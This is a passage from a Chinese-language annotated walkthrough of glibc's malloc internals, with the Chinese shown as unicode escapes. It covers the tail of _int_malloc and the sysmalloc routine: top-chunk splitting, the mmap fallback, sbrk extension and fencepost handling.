(;;) { \u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 MAP \u00b6 /* Skip rest of block if there are no more set bits in this block. */ // \u5982\u679cbit>map\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757 // \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002 if ( bit > map || bit == 0 ) { do { // \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002 // \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86 if ( ++ block >= BINMAPSIZE ) /* out of bins */ goto use_top ; } while (( map = av -> binmap [ block ]) == 0 ); // \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14 // map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002 bin = bin_at ( av , ( block << BINMAPSHIFT )); bit = 1 ; } \u627e\u5230\u5408\u9002\u7684 BIN \u00b6 /* Advance to bin with set bit. There must be one. */ // \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002 // \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684 while (( bit & map ) == 0 ) { bin = next_bin ( bin ); bit <<= 1 ; assert ( bit != 0 ); } \u7b80\u5355\u68c0\u67e5 CHUNK \u00b6 /* Inspect the bin. It is likely to be non-empty */ // \u83b7\u53d6\u5bf9\u5e94\u7684bin victim = last ( bin ); /* If a false alarm (empty bin), clear the bit. */ // \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin // \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002 if ( victim == bin ) { av -> binmap [ block ] = map &= ~ bit ; /* Write through */ bin = next_bin ( bin ); bit <<= 1 ; } \u771f\u6b63\u53d6\u51fa CHUNK \u00b6 else { // \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f size = chunksize ( victim ); /* We know the first chunk in this bin is big enough to use. */ assert (( unsigned long ) ( size ) >= ( unsigned long ) ( nb )); // \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb ; /* unlink */ unlink ( av , victim , bck , fwd ); /* Exhaust */ // \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272 else { // \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d bck = unsorted_chunks ( av ); fwd = bck -> fd ; if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks 2\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; /* advertise as last remainder */ // \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder if ( in_smallbin_range ( nb )) av -> last_remainder = remainder ; if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot ( remainder , remainder_size ); } // \u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } \u4f7f\u7528 top chunk \u00b6 **\u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002**\u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002 use_top : /* If large enough, split off the chunk bordering the end of memory (held in av->top). Note that this is in accord with the best-fit search rule. In effect, av->top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av->top always exists (i.e., has size >= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av -> top ; size = chunksize ( victim ); // \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if (( unsigned long ) ( size ) >= ( unsigned long ) ( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); av -> top = remainder ; // \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u524d\u9762\u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c // top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } // \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if ( have_fastchunks ( av )) { // \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76 malloc_consolidate ( av ); /* restore original bin index */ // \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185 // \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15 // \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5 if ( in_smallbin_range ( nb )) idx = smallbin_index ( nb ); else idx = largebin_index ( nb ); } \u5806\u5185\u5b58\u4e0d\u591f \u00b6 \u5982\u679c\u5806\u5185\u5b58\u4e0d\u591f\uff0c\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528 sysmalloc \u6765\u7533\u8bf7\u5185\u5b58\u4e86\u3002 /* Otherwise, relay to handle system-dependent cases */ // \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002 else { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; } _libc_calloc \u00b6 calloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728 libc \u4e2d\u7684\u5c01\u88c5\u4e3a _libc_calloc \uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b /* calloc(size_t n_elements, size_t element_size); Returns a pointer to n_elements * element_size bytes, with all locations set to zero. */ void * __libc_calloc ( size_t , size_t ); 2020.07.08 \u4e0b\u9762\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u672a\u4ed4\u7ec6\u54c1\u5473 sysmalloc \u00b6 \u6b63\u5982\u8be5\u51fd\u6570\u5934\u7684\u6ce8\u91ca\u6240\u8a00\uff0c\u8be5\u51fd\u6570\u7528\u4e8e\u5f53\u524d\u5806\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u9700\u8981\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u5185\u5b58\u3002 /* sysmalloc handles malloc cases requiring more memory from the system. On entry, it is assumed that av->top does not have enough space to service request for nb bytes, thus requiring that av->top be extended or replaced. */ \u57fa\u672c\u5b9a\u4e49 \u00b6 static void * sysmalloc ( INTERNAL_SIZE_T nb , mstate av ) { mchunkptr old_top ; /* incoming value of av->top */ INTERNAL_SIZE_T old_size ; /* its size */ char * old_end ; /* its end address */ long size ; /* arg to first MORECORE or mmap call */ char * brk ; /* return value from MORECORE */ long correction ; /* arg to 2nd MORECORE call */ char * snd_brk ; /* 2nd return val */ INTERNAL_SIZE_T front_misalign ; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign ; /* partial page left at end of new space */ char * aligned_brk ; /* aligned offset into brk */ mchunkptr p ; /* the allocated/returned chunk */ mchunkptr remainder ; /* remainder frOm allocation */ unsigned long remainder_size ; /* its size */ size_t pagesize = GLRO ( dl_pagesize ); bool tried_mmap = false ; \u6211\u4eec\u53ef\u4ee5\u4e3b\u8981\u5173\u6ce8\u4e00\u4e0b pagesize \uff0c\u5176 #ifndef EXEC_PAGESIZE #define EXEC_PAGESIZE 4096 #endif # define GLRO(name) _##name size_t _dl_pagesize = EXEC_PAGESIZE ; \u6240\u4ee5\uff0c pagesize=4096=0x1000 \u3002 \u8003\u8651 mmap \u00b6 \u6b63\u5982\u5f00\u5934\u6ce8\u91ca\u6240\u8a00\u5982\u679c\u6ee1\u8db3\u5982\u4e0b\u4efb\u4f55\u4e00\u79cd\u6761\u4ef6 \u6ca1\u6709\u5206\u914d\u5806\u3002 \u7533\u8bf7\u7684\u5185\u5b58\u5927\u4e8e mp_.mmap_threshold \uff0c\u5e76\u4e14 mmap \u7684\u6570\u91cf\u5c0f\u4e8e\u6700\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528 mmap\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e34\u754c\u503c\u4e3a static struct malloc_par mp_ = { . top_pad = DEFAULT_TOP_PAD , . n_mmaps_max = DEFAULT_MMAP_MAX , . mmap_threshold = DEFAULT_MMAP_THRESHOLD , . trim_threshold = DEFAULT_TRIM_THRESHOLD , #define NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8)) . arena_test = NARENAS_FROM_NCORES ( 1 ) #if USE_TCACHE , . tcache_count = TCACHE_FILL_COUNT , . tcache_bins = TCACHE_MAX_BINS , . tcache_max_bytes = tidx2usize ( TCACHE_MAX_BINS - 1 ), . tcache_unsorted_limit = 0 /* No limit. */ #endif }; DEFAULT_MMAP_THRESHOLD \u4e3a 128*1024 \u5b57\u8282\uff0c\u5373 128 K\u3002 #ifndef DEFAULT_MMAP_THRESHOLD #define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN #endif /* MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically adjusted MMAP_THRESHOLD. */ #ifndef DEFAULT_MMAP_THRESHOLD_MIN #define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) #endif #ifndef DEFAULT_MMAP_THRESHOLD_MAX /* For 32-bit platforms we cannot increase the maximum mmap threshold much because it is also the minimum value for the maximum heap size and its alignment. Going above 512k (i.e., 1M for new heaps) wastes too much address space. */ #if __WORDSIZE == 32 #define DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024) #else #define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long)) #endif #endif \u4e0b\u9762\u4e3a\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u76ee\u524d\u4e0d\u662f\u6211\u4eec\u5173\u5fc3\u7684\u91cd\u70b9\uff0c\u53ef\u4ee5\u6682\u65f6\u8df3\u8fc7\u3002 /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if ( av == NULL || (( unsigned long )( nb ) >= ( unsigned long )( mp_ . mmap_threshold ) && ( mp_ . n_mmaps < mp_ . n_mmaps_max ))) { char * mm ; /* return value from mmap call*/ try_mmap : /* Round up size to nearest page. For mmapped chunks, the overhead is one SIZE_SZ unit larger than for normal chunks, because there is no following chunk whose prev_size field could be used. See the front_misalign handling below, for glibc there is no need for further alignments unless we have have high alignment. */ if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) size = ALIGN_UP ( nb + SIZE_SZ , pagesize ); else size = ALIGN_UP ( nb + SIZE_SZ + MALLOC_ALIGN_MASK , pagesize ); tried_mmap = true ; /* Don't try if size wraps around 0 */ if (( unsigned long )( size ) > ( unsigned long )( nb )) { mm = ( char * )( MMAP ( 0 , size , PROT_READ | PROT_WRITE , 0 )); if ( mm != MAP_FAILED ) { /* The offset to the start of the mmapped region is stored in the prev_size field of the chunk. This allows us to adjust returned start address to meet alignment requirements here and in memalign(), and still be able to compute proper address argument for later munmap in free() and realloc(). */ if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) { /* For glibc, chunk2mem increases the address by 2*SIZE_SZ and MALLOC_ALIGN_MASK is 2*SIZE_SZ-1. Each mmap'ed area is page aligned and therefore definitely MALLOC_ALIGN_MASK-aligned. */ assert ((( INTERNAL_SIZE_T ) chunk2mem ( mm ) & MALLOC_ALIGN_MASK ) == 0 ); front_misalign = 0 ; } else front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( mm ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { correction = MALLOC_ALIGNMENT - front_misalign ; p = ( mchunkptr )( mm + correction ); set_prev_size ( p , correction ); set_head ( p , ( size - correction ) | IS_MMAPPED ); } else { p = ( mchunkptr ) mm ; set_prev_size ( p , 0 ); set_head ( p , size | IS_MMAPPED ); } /* update statistics */ int new = atomic_exchange_and_add ( & mp_ . n_mmaps , 1 ) + 1 ; atomic_max ( & mp_ . max_n_mmaps , new ); unsigned long sum ; sum = atomic_exchange_and_add ( & mp_ . mmapped_mem , size ) + size ; atomic_max ( & mp_ . max_mmapped_mem , sum ); check_chunk ( av , p ); return chunk2mem ( p ); } } } mmap \u5931\u8d25\u6216\u8005\u672a\u5206\u914d\u5806 \u00b6 /* There are no usable arenas and mmap also failed. */ if (av == NULL) return 0; \u5982\u679c\u662f\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e2d\u7684\u4efb\u4f55\u4e00\u79cd\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u9000\u51fa\u4e86\u3002\u3002 \u8bb0\u5f55\u65e7\u5806\u4fe1\u606f \u00b6 /* Record incoming configuration of top */ old_top = av -> top ; old_size = chunksize ( old_top ); old_end = ( char * )( chunk_at_offset ( old_top , old_size )); brk = snd_brk = ( char * )( MORECORE_FAILURE ); \u68c0\u67e5\u65e7\u5806\u4fe1\u606f 1 \u00b6 /* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert (( old_top == initial_top ( av ) && old_size == 0 ) || (( unsigned long )( old_size ) >= MINSIZE && prev_inuse ( old_top ) && (( unsigned long ) old_end & ( pagesize - 1 )) == 0 )); \u8fd9\u4e2a\u68c0\u67e5\u8981\u6c42\u6ee1\u8db3\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u6761\u4ef6 old_top == initial_top(av) && old_size == 0 \uff0c\u5373\u5982\u679c\u662f\u7b2c\u4e00\u6b21\u7684\u8bdd\uff0c\u5806\u7684\u5927\u5c0f\u9700\u8981\u662f 0\u3002 \u65b0\u7684\u5806\uff0c\u90a3\u4e48 (unsigned long)(old_size) >= MINSIZE && prev_inuse(old_top) \uff0c\u5806\u7684\u5927\u5c0f\u5e94\u8be5\u4e0d\u5c0f\u4e8e MINSIZE \uff0c\u5e76\u4e14\u524d\u4e00\u4e2a\u5806\u5757\u5e94\u8be5\u5904\u4e8e\u4f7f\u7528\u4e2d\u3002 ((unsigned long)old_end & (pagesize - 1)) == 0) \uff0c\u5806\u7684\u7ed3\u675f\u5730\u5740\u5e94\u8be5\u662f\u9875\u5bf9\u9f50\u7684\uff0c\u7531\u4e8e\u9875\u5bf9\u9f50\u7684\u5927\u5c0f\u9ed8\u8ba4\u662f 0x1000\uff0c\u6240\u4ee5\u4f4e 12 \u4e2a\u6bd4\u7279\u9700\u8981\u4e3a 0\u3002 \u68c0\u67e5\u65e7\u5806\u4fe1\u606f 2 \u00b6 /* Precondition: not enough current space to satisfy nb request */ assert (( unsigned long )( old_size ) < ( unsigned long )( nb + MINSIZE )); \u6839\u636e malloc \u4e2d\u7684\u5b9a\u4e49 static void * _int_malloc ( mstate av , size_t bytes ) { INTERNAL_SIZE_T nb ; /* normalized request size */ nb \u5e94\u8be5\u662f\u5df2\u7ecf\u52a0\u4e0a chunk \u5934\u90e8\u7684\u5b57\u8282\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981\u52a0\u4e0a MINSIZE \u5462\uff1f\u8fd9\u662f\u56e0\u4e3a top chunk \u7684\u5927\u5c0f\u5e94\u8be5\u81f3\u5c11\u9884\u7559 MINSIZE \u7a7a\u95f4\uff0c\u4ee5\u4fbf\u4e8e\u5408\u5e76\u3002 \u975e main_arena \u00b6 \u8fd9\u91cc\u6682\u65f6\u4e0d\u662f\u5173\u5fc3\u7684\u91cd\u70b9\uff0c\u6682\u4e14\u4e0d\u5206\u6790\u3002 if ( av != & main_arena ) { heap_info * old_heap , * heap ; size_t old_heap_size ; /* First try to extend the current heap. */ old_heap = heap_for_ptr ( old_top ); old_heap_size = old_heap -> size ; if (( long )( MINSIZE + nb - old_size ) > 0 && grow_heap ( old_heap , MINSIZE + nb - old_size ) == 0 ) { av -> system_mem += old_heap -> size - old_heap_size ; set_head ( old_top , ((( char * ) old_heap + old_heap -> size ) - ( char * ) old_top ) | PREV_INUSE ); } else if (( heap = new_heap ( nb + ( MINSIZE + sizeof ( * heap )), mp_ . top_pad ))) { /* Use a newly allocated heap. */ heap -> ar_ptr = av ; heap -> prev = old_heap ; av -> system_mem += heap -> size ; /* Set up the new top. */ top ( av ) = chunk_at_offset ( heap , sizeof ( * heap )); set_head ( top ( av ), ( heap -> size - sizeof ( * heap )) | PREV_INUSE ); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. */ /* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */ old_size = ( old_size - MINSIZE ) & ~ MALLOC_ALIGN_MASK ; set_head ( chunk_at_offset ( old_top , old_size + 2 * SIZE_SZ ), 0 | PREV_INUSE ); if ( old_size >= MINSIZE ) { set_head ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ ) | PREV_INUSE ); set_foot ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ )); set_head ( old_top , old_size | PREV_INUSE | NON_MAIN_ARENA ); _int_free ( av , old_top , 1 ); } else { set_head ( old_top , ( old_size + 2 * SIZE_SZ ) | PREV_INUSE ); set_foot ( old_top , ( old_size + 2 * SIZE_SZ )); } } else if ( ! tried_mmap ) /* We can at least try to use to mmap memory. */ goto try_mmap ; } Main_arena \u5904\u7406 \u00b6 \u8ba1\u7b97\u5185\u5b58 \u00b6 \u8ba1\u7b97\u53ef\u4ee5\u6ee1\u8db3\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u5c0f\u3002 else { /* av == main_arena */ /* Request enough space for nb + pad + overhead */ size = nb + mp_ . top_pad + MINSIZE ; \u9ed8\u8ba4\u60c5\u51b5\u4e0b top_pad \u5b9a\u4e49\u4e3a #ifndef DEFAULT_TOP_PAD # define DEFAULT_TOP_PAD 131072 #endif \u5373 131072 \u5b57\u8282\uff0c0x20000 \u5b57\u8282\u3002 \u662f\u5426\u8fde\u7eed \u00b6 \u5982\u679c\u6211\u4eec\u5e0c\u671b\u5806\u7684\u7a7a\u95f4\u8fde\u7eed\u7684\u8bdd\uff0c\u90a3\u4e48\u5176\u5b9e\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u5185\u5b58\u3002 /* If contiguous, we can subtract out existing space that we hope to combine with new space. We add it back later only if we don't actually get contiguous space. */ if ( contiguous ( av )) size -= old_size ; \u5bf9\u9f50\u9875\u5927\u5c0f \u00b6 /* Round to a multiple of page size. If MORECORE is not contiguous, this ensures that we only call it with whole-page arguments. And if MORECORE is contiguous and this is not first time through, this preserves page-alignment of previous calls. Otherwise, we correct to page-align below. */ size = ALIGN_UP ( size , pagesize ); \u7533\u8bf7\u5185\u5b58 \u00b6 /* Don't try to call MORECORE if argument is so big as to appear negative. Note that since mmap takes size_t arg, it may succeed below even if we cannot call MORECORE. */ if ( size > 0 ) { brk = ( char * )( MORECORE ( size )); LIBC_PROBE ( memory_sbrk_more , 2 , brk , size ); } \u53ef\u80fd\u6210\u529f \u00b6 if ( brk != ( char * )( MORECORE_FAILURE )) { /* Call the `morecore' hook if necessary. */ void ( * hook )( void ) = atomic_forced_read ( __after_morecore_hook ); if ( __builtin_expect ( hook != NULL , 0 )) ( * hook )(); } \u8fd9\u91cc\u7adf\u7136\u8c03\u7528\u4e86\u4e00\u4e2a hook\uff0c\u6709\u70b9\u610f\u601d\u3002 \u5931\u8d25 \u00b6 \u5931\u8d25\uff0c\u8003\u8651 mmap\u3002 else { /* If have mmap, try using it as a backup when MORECORE fails or cannot be used. This is worth doing on systems that have \"holes\" in address space, so sbrk cannot extend to give contiguous space, but space is available elsewhere. Note that we ignore mmap max count and threshold limits, since the space will not be used as a segregated mmap region. */ /* Cannot merge with old top, so add its size back in */ if ( contiguous ( av )) size = ALIGN_UP ( size + old_size , pagesize ); /* If we are relying on mmap as backup, then use larger units */ if (( unsigned long )( size ) < ( unsigned long )( MMAP_AS_MORECORE_SIZE )) size = MMAP_AS_MORECORE_SIZE ; /* Don't try if size wraps around 0 */ if (( unsigned long )( size ) > ( unsigned long )( nb )) { char * mbrk = ( char * )( MMAP ( 0 , size , PROT_READ | PROT_WRITE , 0 )); if ( mbrk != MAP_FAILED ) { /* We do not need, and cannot use, another sbrk call to find end */ brk = mbrk ; snd_brk = brk + size ; /* Record that we no longer have a contiguous sbrk region. After the first time mmap is used as backup, we do not ever rely on contiguous space since this could incorrectly bridge regions. */ set_noncontiguous ( av ); } } } \u5185\u5b58\u53ef\u80fd\u7533\u8bf7\u6210\u529f \u00b6 if ( brk != ( char * )( MORECORE_FAILURE )) { if ( mp_ . sbrk_base == 0 ) mp_ . sbrk_base = brk ; av -> system_mem += size ; \u60c5\u51b5 1 \u00b6 /* If MORECORE extends previous space, we can likewise extend top size. */ if ( brk == old_end && snd_brk == ( char * )( MORECORE_FAILURE )) set_head ( old_top , ( size + old_size ) | PREV_INUSE ); \u60c5\u51b5 2 - \u610f\u5916\u5185\u5b58\u8017\u5c3d \u00b6 else if ( contiguous ( av ) && old_size && brk < old_end ) /* Oops! Someone else killed our space.. Can't touch anything. */ malloc_printerr ( \"break adjusted to free malloc space\" ); \u5904\u7406\u5176\u4ed6\u610f\u5916\u60c5\u51b5 \u00b6 /* Otherwise, make adjustments: * If the first time through or noncontiguous, we need to call sbrk just to find out where the end of memory lies. * We need to ensure that all returned chunks from malloc will meet MALLOC_ALIGNMENT * If there was an intervening foreign sbrk, we need to adjust sbrk request size to account for fact that we will not be able to combine new space with existing space in old_top. * Almost all systems internally allocate whole pages at a time, in which case we might as well use the whole last page of request. So we allocate enough more memory to hit a page boundary now, which in turn causes future contiguous calls to page-align. */ else { front_misalign = 0 ; end_misalign = 0 ; correction = 0 ; aligned_brk = brk ; \u5904\u7406\u8fde\u7eed\u5185\u5b58 \u00b6 /* handle contiguous cases */ if ( contiguous ( av )) { /* Count foreign sbrk as system_mem. */ if ( old_size ) av -> system_mem += brk - old_end ; /* Guarantee alignment of first new chunk made from this space */ front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ correction = MALLOC_ALIGNMENT - front_misalign ; aligned_brk += correction ; } /* If this isn't adjacent to existing space, then we will not be able to merge with old_top space, so must add to 2nd request. */ correction += old_size ; /* Extend the end address to hit a page boundary */ end_misalign = ( INTERNAL_SIZE_T )( brk + size + correction ); correction += ( ALIGN_UP ( end_misalign , pagesize )) - end_misalign ; assert ( correction >= 0 ); snd_brk = ( char * )( MORECORE ( correction )); /* If can't allocate correction, try to at least find out current brk. It might be enough to proceed without failing. Note that if second sbrk did NOT fail, we assume that space is contiguous with first sbrk. This is a safe assumption unless program is multithreaded but doesn't use locks and a foreign sbrk occurred between our first and second calls. */ if ( snd_brk == ( char * )( MORECORE_FAILURE )) { correction = 0 ; snd_brk = ( char * )( MORECORE ( 0 )); } else { /* Call the `morecore' hook if necessary. */ void ( * hook )( void ) = atomic_forced_read ( __after_morecore_hook ); if ( __builtin_expect ( hook != NULL , 0 )) ( * hook )(); } } \u5904\u7406\u4e0d\u8fde\u7eed\u5185\u5b58 \u00b6 /* handle non-contiguous cases */ else { if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) /* MORECORE/mmap must correctly align */ assert ((( unsigned long ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ) == 0 ); else { front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ aligned_brk += MALLOC_ALIGNMENT - front_misalign ; } } /* Find out current end of memory */ if ( snd_brk == ( char * )( MORECORE_FAILURE )) { snd_brk = ( char * )( MORECORE ( 0 )); } } \u8c03\u6574 \u00b6 /* Adjust top based on results of second sbrk */ if ( snd_brk != ( char * )( MORECORE_FAILURE )) { av -> top = ( mchunkptr ) aligned_brk ; set_head ( av -> top , ( snd_brk - aligned_brk + correction ) | PREV_INUSE ); av -> system_mem += correction ; /* If not the first time through, we either have a gap due to foreign sbrk or a non-contiguous region. Insert a double fencepost at old_top to prevent consolidation with space we don't own. These fenceposts are artificial chunks that are marked as inuse and are in any case too small to use. We need two to make sizes and alignments work out. */ if ( old_size != 0 ) { /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = ( old_size - 4 * SIZE_SZ ) & ~ MALLOC_ALIGN_MASK ; set_head ( old_top , old_size | PREV_INUSE ); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ set_head ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ ) | PREV_INUSE ); set_head ( chunk_at_offset ( old_top , old_size + 2 * SIZE_SZ ), ( 2 * SIZE_SZ ) | PREV_INUSE ); /* If possible, release the rest. */ if ( old_size >= MINSIZE ) { _int_free ( av , old_top , 1 ); } } } } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u8fd9\u91cc\u7a0b\u5e8f\u5c06\u65e7\u7684 top chunk \u8fdb\u884c\u4e86\u91ca\u653e\uff0c\u90a3\u4e48\u5176\u4f1a\u6839\u636e\u5927\u5c0f\u8fdb\u5165\u4e0d\u540c\u7684 bin \u6216 tcache \u4e2d\u3002 \u66f4\u65b0\u6700\u5927\u5185\u5b58 \u00b6 if (( unsigned long ) av -> system_mem > ( unsigned long )( av -> max_system_mem )) av -> max_system_mem = av -> system_mem ; check_malloc_state ( av ); \u5206\u914d\u5185\u5b58\u5757 \u00b6 \u83b7\u53d6\u5927\u5c0f \u00b6 /* finally, do the allocation */ p = av -> top ; size = chunksize ( p ); \u5207\u5206 TOP \u00b6 /* check that one of the above allocation paths succeeded */ if 